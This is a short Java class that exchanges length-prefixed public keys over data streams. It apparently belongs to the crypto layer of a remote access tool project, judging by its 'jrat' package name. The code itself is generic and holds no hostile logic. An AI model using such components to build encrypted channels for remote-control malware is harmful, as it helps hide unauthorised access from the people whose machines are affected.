package jrat.common.crypto;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.security.KeyPair;
import java.security.PublicKey;

public class StreamKeyExchanger extends KeyExchanger {
	
	protected DataInputStream dis;
	protected DataOutputStream dos;
	
	public StreamKeyExchanger(KeyPair pair, DataInputStream dis, DataOutputStream dos) {
		super(pair);
		this.dis = dis;
		this.dos = dos;
	}
	
	/**
	 * Read public key from DataInputStream
	 */
	@Override
	public PublicKey readRemoteKey() throws Exception {
		int len = dis.readInt();
		byte[] key = new byte[len];
		
		dis.readFully(key);
		
		this.remoteKey = KeyUtils.getPublicKey(key);
		
		return this.remoteKey;
	}
	
	/**
	 * Write public key to DataOutputStream
	 */
	@Override
	public void writePublicKey() throws Exception {
		byte[] encoded = pair.getPublic().getEncoded();
		
		dos.writeInt(encoded.length);
		dos.write(encoded);
	}
}
